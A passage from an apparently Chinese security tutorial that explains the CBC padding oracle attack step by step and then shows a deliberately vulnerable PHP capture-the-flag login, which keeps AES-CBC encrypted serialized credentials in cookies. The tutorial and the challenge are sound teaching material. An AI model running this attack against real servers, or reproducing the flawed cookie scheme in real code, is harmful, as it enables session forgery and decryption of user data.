data-original="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/9113969-911e905ee20482be.png" alt="图片.png"></p>
+<h3 id="6-3-服务器判断过程"><a href="#6-3-服务器判断过程" class="headerlink" title="6.3 服务器判断过程"></a>6.3 服务器判断过程</h3><p>假设我们向服务器提交了正确的密码，我们的密码在经过CBC模式加密后传给</p>
+<p>了服务器，这时服务器会对我们传来的信息尝试解密，如果可以正常解密会返</p>
+<p>回一个值表示正确，如果不能正常解密则会返回一个值表示错误。而事实上，</p>
+<p>判断提交的密文能不能正常解密，第一步就是判断密文最后一组的填充值是否</p>
+<p>正确，也就是观察最后一组解密得到的结果的最后几位，如果错误将直接返回</p>
+<p>错误，如果正确，再将解密后的结果与服务器存储的结果比对，判断是不是正</p>
+<p>确的用户。也就是说服务器一共可能有三种判断结果：</p>
+<ul>
+<li>如果参数是完全正确的，身份认证成功，返回 HTTP 200 OK，提示认证成功(也就是解密的明文正确)</li>
+<li>如果参数是可以解密为正确格式的明文的密文（明文 Padding 等正确），但是身份认证失败，返回 HTTP 200 OK，提示认证失败（只有padding格式正确，我们主要利用这一点）</li>
+<li>如果参数不是可以解密为正确格式的明文的密文（明文的 Padding 错误等），服务器内部抛出异常，返回 HTTP 500 Internal Server Error</li>
+<li>其中第一种情况与第二 三种情况的返回值一定不一样，这就给了我们可乘之机——我们可以利用服务器的返回值判断我们提交的内容能不能正常解密，进一步讲，我们可以知道最后一组密文的填充位符不符合填充标准。</li>
+</ul>
+<h3 id="6-4-padding-oracle-attack核心"><a href="#6-4-padding-oracle-attack核心" class="headerlink" title="6.4 padding oracle attack核心"></a>6.4 padding oracle attack核心</h3><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/9113969-77a058a532beb7ed.png" alt="图片.png"></p>
+<p>如上图所示，明文填充了四位时，如果最后一组密文解密后的结果</p>
+<p>（Intermediary Value也就是中间值）与前一组密文（Initialization Vector也就是IV值）异或得到的最后四位是0×04，那么服务器就会返回可以正常解密。</p>
+<p>CBC模式的解密过程，第n组密文解密后的中间值与前一组的密文异或便可得到</p>
+<p>明文，现在我们不知道解密的密钥key，但我们知道所有的密文，因此只要我们</p>
+<p>能够得到中间值便可以得到正确的明文（进行一次异或运算便可），而中间值</p>
+<p>是由服务器解密得到的，因此我们虽然不知道怎么解密但我们可以利用服务器</p>
+<p>帮我们解密，我们所要做的是能确定我们得到的中间值是正确的，这也是</p>
+<p>padding oracle attack的核心——找出正确的中间值。</p>
+<ul>
+<li>(1）假设我们捕获到了传输的密文并且我们知道是CBC模式采用的什么加密算法，我们把密文按照加密算法的要求分好组，然后对倒数第二组密文进行构造；</li>
+<li>(2）先假定明文只填充了一字节，对倒数第二组密文的最后一字节从0×00到0xff逐个赋值并逐个向服务器提交，直到服务返回值表示构造后的密文可以正常解密，这意味着构造后的密文作为中间值（图中黄色的那一行）解密最后一组明文，明文的最后一位是0×01（如图所示），也就是说构造的倒数第二组密文的最后一字节与最后一组密文对应中间值（绿色的那一行）的最后一位相异或的结果是0×01<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/9113969-df79e1a197ec978c.png" alt="图片.png"></li>
+<li>（3）利用异或运算的性质，我们把我们构造的密文的最后一字节与0×01异或便可得到最后一位密文解密后的中间值是什么，这里我们设为M1，这一过程其实就是对应下图CBC解密过程中红圈圈出来的地方，1就是我们想要得到的中间值，二就是我们构造的密文也就是最后一组密文的IV值，我们已经知道了plaintext的最后一字节是0×01，从图中可以看到它是由我们构造的IV值与中间值的最后一字节异或得到的；<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/9113969-c8e9fff96ff38edc.png" alt="图片.png"></li>
+<li>（4）再假定明文填充了两字节也就是明文最后两字节是0×02，接着构造倒数第二组密文，我们把M1与0×02异或可以得到填充两字节时密文<br>的最后一位应该是什么，这时候我们只需要对倒数第二位进行不断地赋值尝试（也是从0×00到0xff），当服务器返回值表示可以正常解密时<br>，我们把此时的倒数第二位密文的取值与0×02异或便可得到最后一组密文倒数第二字节对应的中间值；</li>
+<li>（5）后再构造出倒数第三倒数第四直到得到最后一组密文的中间值，把这个中间值与截获的倒数第二组密文异或便可得到最后一组分组的明文；</li>
+<li>（6）舍弃掉最后一组密文，只提交第一组到倒数第二组密文，通过构造倒数第三组密文得到倒数第二组密文的铭文，以此类推，最后我们便<br>可以得到全部的明文</li>
+</ul>
+<h3 id="6-5-攻击成立的条件"><a href="#6-5-攻击成立的条件" class="headerlink" title="6.5 攻击成立的条件"></a>6.5 攻击成立的条件</h3><p>攻击成立的两个重要假设前提:</p>
+<ul>
+<li>攻击者能够获得密文（Ciphertext），以及附带在密文前面的IV（初始化向量）</li>
+<li>攻击者能够触发密文的解密过程，且能够知道密文的解密结果（是否是正常解密）</li>
+</ul>
+<h2 id="0x07-运用-参考"><a href="#0x07-运用-参考" class="headerlink" title="0x07 运用(参考)"></a>0x07 运用(参考)</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&quot;SECRET_KEY&quot;</span>, <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/root/key&#x27;</span>));</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&quot;METHOD&quot;</span>, <span class="string">&quot;aes-128-cbc&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_random_iv</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$random_iv</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="number">16</span>;<span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="variable">$random_iv</span>.=<span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">rand</span>(<span class="number">1</span>,<span class="number">255</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$random_iv</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$info</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$iv</span> = <span class="title function_ invoke__">get_random_iv</span>();</span><br><span class="line">    <span class="variable">$plain</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$info</span>);</span><br><span class="line">    <span class="variable">$cipher</span> = <span class="title function_ invoke__">openssl_encrypt</span>(<span class="variable">$plain</span>, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, <span class="variable">$iv</span>);</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="variable">$info</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;iv&quot;</span>, <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$iv</span>));</span><br><span class="line">    <span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;cipher&quot;</span>, <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$cipher</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_login</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;cipher&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;iv&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$cipher</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;cipher&#x27;</span>]);</span><br><span class="line">        <span class="variable">$iv</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_COOKIE</span>[<span class="string">&quot;iv&quot;</span>]);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$plain</span> = <span class="title function_ invoke__">openssl_decrypt</span>(<span class="variable">$cipher</span>, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, <span class="variable">$iv</span>))&#123;</span><br><span class="line">            <span class="variable">$info</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$plain</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;&lt;p&gt;base64_decode(&#x27;&quot;</span>.<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$plain</span>).<span class="string">&quot;&#x27;) can&#x27;t unserialize&lt;/p&gt;&quot;</span>);</span><br><span class="line">            <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="variable">$info</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;ERROR!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">show_homepage</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_SESSION</span>[<span class="string">&quot;username&quot;</span>]===<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;p&gt;hello &#x27;</span>.<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>].<span class="string">&#x27;&lt;/p&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;p&gt;Only admin can see flag&lt;/p&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;p&gt;&lt;a href=&quot;loginout.php&quot;&gt;Log out&lt;/a&gt;&lt;/p&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$username</span> = (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$password</span> = (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$username</span> === <span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&#x27;&lt;p&gt;admin are not allowed to login&lt;/p&gt;&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$info</span> = <span class="keyword">array</span>(<span class="string">&#x27;username&#x27;</span>=&gt;<span class="variable">$username</span>,<span class="string">&#x27;password&#x27;</span>=&gt;<span class="variable">$password</span>);</span><br><span class="line">        <span class="title function_ invoke__">login</span>(<span class="variable">$info</span>);</span><br><span class="line">        <span class="title function_ invoke__">show_homepage</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&quot;username&quot;</span>]))&#123;</span><br><span class="line">        <span class="title function_ invoke__">check_login</span>();</span><br><span class="line">        <span class="title function_ invoke__">show_homepage</span>();</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;body class=&quot;login-body&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;div id=&quot;wrapper&quot;&gt;</span></span><br><span class="line"><span class="string">                    &lt;div class=&quot;user-icon&quot;&gt;&lt;/div&gt;</span></span><br><span class="line"><span class="string">                    &lt;div class=&quot;pass-icon&quot;&gt;&lt;/div&gt;</span></span><br><span class="line"><span class="string">                    &lt;form name=&quot;login-form&quot; class=&quot;login-form&quot; action=&quot;&quot; method=&quot;post&quot;&gt;</span></span><br><span class="line"><span class="string">                        &lt;div class=&quot;header&quot;&gt;</span></span><br><span class="line"><span class="string">                        &lt;h1&gt;Login Form&lt;/h1&gt;</span></span><br><span class="line"><span class="string">                        &lt;span&gt;Fill out the form below to login to my super awesome imaginary control panel.&lt;/span&gt;</span></span><br><span class="line"><span class="string">                        &lt;/div&gt;</span></span><br><span class="line"><span class="string">                        &lt;div class=&quot;content&quot;&gt;</span></span><br><span class="line"><span class="string">                        &lt;input name=&quot;username&quot; type=&quot;text&quot; class=&quot;input username&quot; value=&quot;Username&quot; onfocus=&quot;this.value=\&#x27;\&#x27;&quot; /&gt;</span></span><br><span class="line"><span class="string">                        &lt;input name=&quot;password&quot; type=&quot;password&quot; class=&quot;input password&quot; value=&quot;Password&quot; onfocus=&quot;this.value=\&#x27;\&#x27;&quot; /&gt;</span></span><br><span class="line"><span class="string">                        &lt;/div&gt;</span></span><br><span class="line"><span class="string">                        &lt;div class=&quot;footer&quot;&gt;</span></span><br><span class="line"><span class="string">                        &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Login&quot; class=&quot;button&quot; /&gt;</span></span><br><span class="line"><span class="string">                        &lt;/div&gt;</span></span><br><span class="line"><span class="string">                    &lt;/form&gt;</span></span><br><span class="line"><span class="string">                &lt;/div&gt;</span></span><br><span class="line"><span class="string">            &lt;/body&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>1.如果username&#x3D;&#x3D;&#x3D;admin就输出flag，但是禁止了admin登陆。<br>2.把username和password构造为一个数组，然后进行序列化，并对这个序列化对象进行aes-128-cbc加密，iv值为16位随机数。加密值赋值给cipher。<br><a target="_blank" rel="noopener" href="http://php.net/manual/zh/function.openssl-encrypt.php">openssl_encrypt()函数</a><br>3.session[username]&#x3D;username序列化并cbc加密后的值。对iv和cipher进行base64加密并设置了cookie<br>4.最后对cipher和iv进行base64解密。然后对cipher进行cbc解密，如果与原序列化对象值相等则对其进行反序列化，错误则报错 <code>die(&quot;&lt;p&gt;base64_decode(&#39;&quot;.base64_encode($plain).&quot;&#39;) can&#39;t unserialize&lt;/p&gt;</code>。把反序列化后username值赋给session[username]。</p>
